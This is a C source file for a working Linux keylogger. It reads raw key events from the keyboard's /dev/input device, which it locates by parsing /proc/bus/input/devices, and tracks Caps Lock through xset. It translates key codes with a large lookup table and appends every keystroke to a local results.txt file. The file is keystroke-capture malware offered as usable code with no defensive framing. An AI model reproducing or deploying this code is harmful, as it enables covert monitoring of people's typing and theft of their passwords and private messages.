#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>

#define LOG_FILE_PATH "./results.txt"
#define CAPS_ACTIVE 1
#define CODES 250
#define LENGTH 25

char codes[CODES][LENGTH];

void init();
char *getEvent();
int isCapsActive();

int main()
{
  init();

  int caps_status = isCapsActive();
  struct input_event ev;
  static char path_keyboard[20] = "/dev/input/";

  strcat(path_keyboard, getEvent());
  path_keyboard[strlen(path_keyboard) - 1] = 0;

  int device_keyboard = open(path_keyboard, O_RDONLY);

  printf("Caps active: %i\n", caps_status);

  if (errno > 0)
  {
    printf("Error: %d\n", device_keyboard);
    exit(1);
  }

  FILE *fp = fopen(LOG_FILE_PATH, "a");

  if (fp == NULL)
  {
    printf("Error while opening txt file");
    exit(1);
  }

  while (1)
  {
    read(device_keyboard, &ev, sizeof(ev));

    if (ev.type == EV_KEY && ev.value == 0)
    {
      int code = (int)ev.code;
      char *key_value = codes[code];

      if (ev.code == KEY_CAPSLOCK)
        caps_status = (caps_status == 1) ? 0 : 1;

      if (
          caps_status != CAPS_ACTIVE &&
          ((code >= 16 && code <= 25) || (code >= 30 && code <= 38) || (code >= 44 && code <= 50)))
      {
        fprintf(fp, "%c", (char)(key_value[0] + 32));
      }
      else
        fprintf(fp, "%s", key_value);

      fflush(fp);
    }
  }
}

void init()
{
  strcpy(codes[0], " RESERVED ");
  strcpy(codes[1], " ESC ");
  strcpy(codes[2], "1");
  strcpy(codes[3], "2");
  strcpy(codes[4], "3");
  strcpy(codes[5], "4");
  strcpy(codes[6], "5");
  strcpy(codes[7], "6");
  strcpy(codes[8], "7");
  strcpy(codes[9], "8");
  strcpy(codes[10], "9");
  strcpy(codes[11], "0");
  strcpy(codes[12], "-");
  strcpy(codes[13], "=");
  strcpy(codes[14], " BACKSPACE ");
  strcpy(codes[15], " TAB \t");
  strcpy(codes[16], "Q");
  strcpy(codes[17], "W");
  strcpy(codes[18], "E");
  strcpy(codes[19], "R");
  strcpy(codes[20], "T");
  strcpy(codes[21], "Y");
  strcpy(codes[22], "U");
  strcpy(codes[23], "I");
  strcpy(codes[24], "O");
  strcpy(codes[25], "P");
  strcpy(codes[26], "{");
  strcpy(codes[27], "}");
  strcpy(codes[28], " ENTER \n");
  strcpy(codes[29], " LEFT_CTRL ");
  strcpy(codes[30], "A");
  strcpy(codes[31], "S");
  strcpy(codes[32], "D");
  strcpy(codes[33], "F");
  strcpy(codes[34], "G");
  strcpy(codes[35], "H");
  strcpy(codes[36], "J");
  strcpy(codes[37], "K");
  strcpy(codes[38], "L");
  strcpy(codes[39], ";");
  strcpy(codes[40], "'");
  strcpy(codes[41], "`");
  strcpy(codes[42], " LEFT_SHIFT ");
  strcpy(codes[43], "\\");
  strcpy(codes[44], "Z");
  strcpy(codes[45], "X");
  strcpy(codes[46], "C");
  strcpy(codes[47], "V");
  strcpy(codes[48], "B");
  strcpy(codes[49], "N");
  strcpy(codes[50], "M");
  strcpy(codes[51], ",");
  strcpy(codes[52], ".");
  strcpy(codes[53], "/");
  strcpy(codes[54], " RIGHT_SHIFT ");
  strcpy(codes[55], "*");
  strcpy(codes[56], " LEFT_ALT ");
  strcpy(codes[57], " ");
  strcpy(codes[58], " CAPS_LOCK ");
  strcpy(codes[59], " F1 ");
  strcpy(codes[60], " F2 ");
  strcpy(codes[61], " F3 ");
  strcpy(codes[62], " F4 ");
  strcpy(codes[63], " F5 ");
  strcpy(codes[64], " F6 ");
  strcpy(codes[65], " F7 ");
  strcpy(codes[66], " F8 ");
  strcpy(codes[67], " F9 ");
  strcpy(codes[68], " F10 ");
  strcpy(codes[69], " NUM_LOCK ");
  strcpy(codes[70], " SCROLL_LOCK ");
  strcpy(codes[71], "7");
  strcpy(codes[72], "8");
  strcpy(codes[73], "9");
  strcpy(codes[74], "-");
  strcpy(codes[75], "4");
  strcpy(codes[76], "5");
  strcpy(codes[77], "6");
  strcpy(codes[78], "+");
  strcpy(codes[79], "1");
  strcpy(codes[80], "2");
  strcpy(codes[81], "3");
  strcpy(codes[82], "0");
  strcpy(codes[83], ".");
  strcpy(codes[84], " NOT_FOUND ");
  strcpy(codes[85], "");
  strcpy(codes[86], "");
  strcpy(codes[87], " F11 ");
  strcpy(codes[88], " F12 ");
  strcpy(codes[89], "");
  strcpy(codes[90], "");
  strcpy(codes[91], "");
  strcpy(codes[92], "");
  strcpy(codes[93], "");
  strcpy(codes[94], "");
  strcpy(codes[95], "");
  strcpy(codes[96], " ENTER \n");
  strcpy(codes[97], " RIGHT_CTRL ");
  strcpy(codes[98], "/");
  strcpy(codes[99], "");
  strcpy(codes[100], " RIGHT_ALT ");
  strcpy(codes[101], " LINE_FEED ");
  strcpy(codes[102], " HOME ");
  strcpy(codes[103], " UP ");
  strcpy(codes[104], " PAGE_UP ");
  strcpy(codes[105], " LEFT ");
  strcpy(codes[106], " RIGHT ");
  strcpy(codes[107], " END ");
  strcpy(codes[108], " DOWN ");
  strcpy(codes[109], " PAGE_DOWN ");
  strcpy(codes[110], " INSERT ");
  strcpy(codes[111], " DELETE ");
  strcpy(codes[112], " MACRO ");
  strcpy(codes[113], " MUTE ");
  strcpy(codes[114], " VOLUME_DOWN ");
  strcpy(codes[115], " VOLUME_UP ");
  strcpy(codes[116], " POWER ");
  strcpy(codes[117], "=");
  strcpy(codes[118], "+/-");
  strcpy(codes[119], " PAUSE ");
  strcpy(codes[120], " SCALE ");
  strcpy(codes[121], ",");
  strcpy(codes[122], "");
  strcpy(codes[123], "");
  strcpy(codes[124], " YEN ");
  strcpy(codes[125], " LEFT_META ");
  strcpy(codes[126], " RIGHT_META ");
  strcpy(codes[127], " COMPOSE ");
  strcpy(codes[128], " STOP ");
  strcpy(codes[129], " AGAIN ");
  strcpy(codes[130], " PROPS ");
  strcpy(codes[131], " UNDO ");
  strcpy(codes[132], " FRONT ");
  strcpy(codes[133], " COPY ");
  strcpy(codes[134], " OPEN ");
  strcpy(codes[135], " PASTE ");
  strcpy(codes[136], " FIND ");
  strcpy(codes[137], " CUT ");
  strcpy(codes[138], " HELP ");
  strcpy(codes[139], " MENU ");
  strcpy(codes[140], " CALC ");
  strcpy(codes[141], " SETUP ");
  strcpy(codes[142], " SLEEP ");
  strcpy(codes[143], " WAKE_UP ");
  strcpy(codes[144], " FILE ");
  strcpy(codes[145], " SEND_FILE ");
  strcpy(codes[146], " DELETE_FILE ");
  strcpy(codes[147], " XFER ");
  strcpy(codes[148], " PROG_1 ");
  strcpy(codes[149], " PROG_2 ");
  strcpy(codes[150], " WWW ");
  strcpy(codes[151], " MSDOS ");
  strcpy(codes[152], " COFFE ");
  strcpy(codes[153], " ROTATE_DISPLAY ");
  strcpy(codes[154], " CYCLE_WINDOW ");
  strcpy(codes[155], " MAIL ");
  strcpy(codes[156], " BOOKMARKS ");
  strcpy(codes[157], " COMPUTER ");
  strcpy(codes[158], " BACK ");
  strcpy(codes[159], " FORWARD ");
  strcpy(codes[160], " CLOSE_CD ");
  strcpy(codes[161], " EJECT_CD ");
  strcpy(codes[162], " F4EJECT_CLOSE_CD ");
  strcpy(codes[163], " NEXT_SONG ");
  strcpy(codes[164], " PLAY/PAUSE ");
  strcpy(codes[165], " PREV_SONG ");
  strcpy(codes[166], " STOP_CD ");
  strcpy(codes[167], " RECORD ");
  strcpy(codes[168], " REWIND ");
  strcpy(codes[169], " PHONE ");
  strcpy(codes[170], " ISO ");
  strcpy(codes[171], " CONFIG ");
  strcpy(codes[172], " HOME_PAGE ");
  strcpy(codes[173], " REFRESH ");
  strcpy(codes[174], " EXIT ");
  strcpy(codes[175], " MOVE ");
  strcpy(codes[176], " EDIT ");
  strcpy(codes[177], " SCROLL_UP ");
  strcpy(codes[178], " SCROLL_DOWN ");
  strcpy(codes[179], "(");
  strcpy(codes[180], ")");
  strcpy(codes[181], " NEW ");
  strcpy(codes[182], " REDO ");
  strcpy(codes[183], " F13 ");
  strcpy(codes[184], " F14 ");
  strcpy(codes[185], " F15 ");
  strcpy(codes[186], " F16");
  strcpy(codes[187], " F17 ");
  strcpy(codes[188], " F18 ");
  strcpy(codes[189], " F19 ");
  strcpy(codes[190], " F20 ");
  strcpy(codes[191], " F21 ");
  strcpy(codes[192], " F22 ");
  strcpy(codes[193], " F23 ");
  strcpy(codes[194], " F24 ");
  strcpy(codes[195], "");
  strcpy(codes[196], "");
  strcpy(codes[197], "");
  strcpy(codes[198], "");
  strcpy(codes[199], "");
  strcpy(codes[200], " PLAY_CD ");
  strcpy(codes[201], " PAUSE_CD ");
  strcpy(codes[202], " PROG_3 ");
  strcpy(codes[203], " PROG_4 ");
  strcpy(codes[204], " ALL_APPS ");
  strcpy(codes[205], " SUSPEND ");
  strcpy(codes[206], " CLOSE ");
  strcpy(codes[207], " PLAY ");
  strcpy(codes[208], " FAST_FORWARD ");
  strcpy(codes[209], " BASS_BOOST ");
  strcpy(codes[210], " PRINT ");
  strcpy(codes[211], " HP ");
  strcpy(codes[212], " CAMERA ");
  strcpy(codes[213], " SOUND ");
  strcpy(codes[214], "?");
  strcpy(codes[215], " EMAIL ");
  strcpy(codes[216], " CHAT ");
  strcpy(codes[217], " SEARCH ");
  strcpy(codes[218], " CONNECT ");
  strcpy(codes[219], " FINANCE ");
  strcpy(codes[220], " SPORT ");
  strcpy(codes[221], " SHOP ");
  strcpy(codes[222], " ALT_ERASE ");
  strcpy(codes[223], " CANCEL ");
  strcpy(codes[224], " BRIGHTNESS_DOWN ");
  strcpy(codes[225], " BRIGHTNESS_UP");
  strcpy(codes[226], " MEDIA ");
  strcpy(codes[227], " SWITCH_VIDEO_MODE ");
  strcpy(codes[228], "");
  strcpy(codes[229], "");
  strcpy(codes[230], "");
  strcpy(codes[231], " SEND ");
  strcpy(codes[232], " REPLY ");
  strcpy(codes[233], " FORWARD_MAIL ");
  strcpy(codes[234], " SAVE ");
  strcpy(codes[235], " DOCUMENTS ");
  strcpy(codes[236], " BATTERY ");
  strcpy(codes[237], " BLUETOOTH ");
  strcpy(codes[238], " WLAN ");
  strcpy(codes[239], " UWB ");
  strcpy(codes[240], " UNKNOWN ");
  strcpy(codes[241], " NEXT_VIDEO ");
  strcpy(codes[242], " PREV_VIDEO ");
  strcpy(codes[243], " BRIGHTNESS_CYCLE ");
  strcpy(codes[244], " BRIGHTNESS_AUTO ");
  strcpy(codes[245], " DISPLAY_OFF ");
  strcpy(codes[246], " WWAN ");
  strcpy(codes[247], " RADIO_KILL ");
  strcpy(codes[248], " MIC_MUTE ");
}

char *getEvent()
{
  char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
  static char event[8];
  FILE *pipe = popen(command, "r");

  if (!pipe)
    exit(1);

  fgets(event, 8, pipe);
  pclose(pipe);

  return event;
}

int isCapsActive()
{
  char *command = "xset q | grep -E -o 'Caps Lock:[ ]+(off|on)' | grep -E -o '(off|on)'";
  char status[5];

  FILE *pipe = popen(command, "r");

  if (!pipe)
    exit(1);

  fgets(status, 5, pipe);
  pclose(pipe);

  status[strlen(status) - 1] = 0;

  return (strcmp(status, "off") == 0) ? 0 : 1;
}
